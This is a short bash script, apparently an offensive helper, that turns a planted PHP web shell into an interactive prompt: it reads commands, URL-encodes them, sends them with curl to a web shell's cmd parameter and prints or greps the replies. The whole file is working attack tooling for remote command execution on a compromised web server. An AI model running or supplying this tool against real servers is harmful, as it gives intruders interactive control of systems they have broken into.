#!/bin/bash
echo -e "Usage: ./webwrapper.sh http://localhost:8000/webshell.php?cmd= ['grep_arguments']"

url="$1"
gargs="$2"

while true; do
  read -p '>' webcmd
  output=$(curl -s "$url$(printf "$webcmd" | jq -sRr '@uri')" --output -)
  if [ "$2" ]; then
    echo "$output" | grep $gargs
  else
    echo "$output"
  fi
done
